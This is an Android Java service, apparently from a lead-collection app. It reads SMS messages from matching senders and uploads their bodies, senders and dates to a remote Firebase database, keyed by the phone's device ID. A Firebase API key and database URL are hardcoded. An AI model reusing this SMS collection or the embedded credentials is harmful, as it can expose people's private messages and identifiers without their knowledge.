package com.nfx.leadmessages;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.firebase.FirebaseApp;
import com.google.firebase.FirebaseOptions;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

/**
 * Created by Admin on 01-02-2017.
 */

public class ReadMessages extends Service {
    private String fpId,mobileId;
    private static final Uri MESSAGE_URI = Uri.parse("content://sms/");
    private String[] projections=new String[]{"_id","date","address","body","seen"};
    private String selection="";
    private String order="date DESC";
    private int selectionLength=Constants.selections.length;


    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        SharedPreferences pref =getSharedPreferences(Constants.SHARED_PREF, Context.MODE_PRIVATE);
        fpId =pref.getString(Constants.FP_ID,null);

        TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
        mobileId = tm.getDeviceId();
        if(mobileId == null || fpId == null){
            return Service.START_NOT_STICKY;
        }
        for(int i=0;i<selectionLength;i++){

            if(i == selectionLength-1){
                selection+=" address Like \"%"+Constants.selections[i]+"%\"";
            }
            else{
                selection+=" address Like \"%"+Constants.selections[i]+"%\" or";
            }

        }
        //MOBILE_ID = Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);

        new Thread(new Runnable() {
            @Override
            public void run() {
                FirebaseOptions options = new FirebaseOptions.Builder()
                        .setApiKey("AIzaSyBowYAh4TLbruwJoqL3QnQaKhBmB83EgEs")
                        .setApplicationId("1:506969475000:android:afe3b748e8b5c95f")
                        .setDatabaseUrl("https://nfxteam-153211.firebaseio.com")
                        .build();
                FirebaseApp secondApp = null;
                try {
                    secondApp = FirebaseApp.getInstance("second app");
                }catch(Exception e) {
                        secondApp = FirebaseApp.initializeApp(getApplicationContext(), options, "second app");
                }
                FirebaseDatabase secondDatabase = FirebaseDatabase.getInstance(secondApp);
                DatabaseReference mDatabase = secondDatabase.getReference();
                readMessage(mDatabase);
                stopSelf();
            }
        }).start();
        return Service.START_STICKY;
    }

    @Override
    public void onCreate() {
        super.onCreate();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void readMessage(DatabaseReference mDatabase){
        ContentResolver resolver = getContentResolver();
        Cursor cursor = resolver.query(MESSAGE_URI,projections,selection,null,order);
            if(cursor!=null && cursor.moveToFirst()){

                MessageListModel.PhoneIds phoneIds=new MessageListModel.PhoneIds();
                phoneIds.setDate(String.valueOf(System.currentTimeMillis()));
                phoneIds.setPhoneId(mobileId);
                DatabaseReference phoneIdRef = mDatabase.child(fpId+Constants.DETAILS).child(Constants.PHONE_IDS);
                phoneIdRef.child(mobileId).setValue(phoneIds);

                MessageListModel.SmsMessage message;
                DatabaseReference MessageIdRef = mDatabase.child(fpId+Constants.MESSAGES).child(mobileId);
                MessageIdRef.removeValue();
                do{

                    message = MessageListModel.SmsMessage.getInstance()
                            .setId(cursor.getLong(0))
                            .setDate(cursor.getLong(1))
                            .setSubject(cursor.getString(2))
                            .setBody(cursor.getString(3))
                            .setSeen(cursor.getString(4));

                    String key = MessageIdRef.push().getKey();
                    MessageIdRef.child(key).setValue(message);

                    Log.v("ggg",message.toString());

                }while(cursor.moveToNext());
                cursor.close();
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.v("ggg","destroy");
    }
}
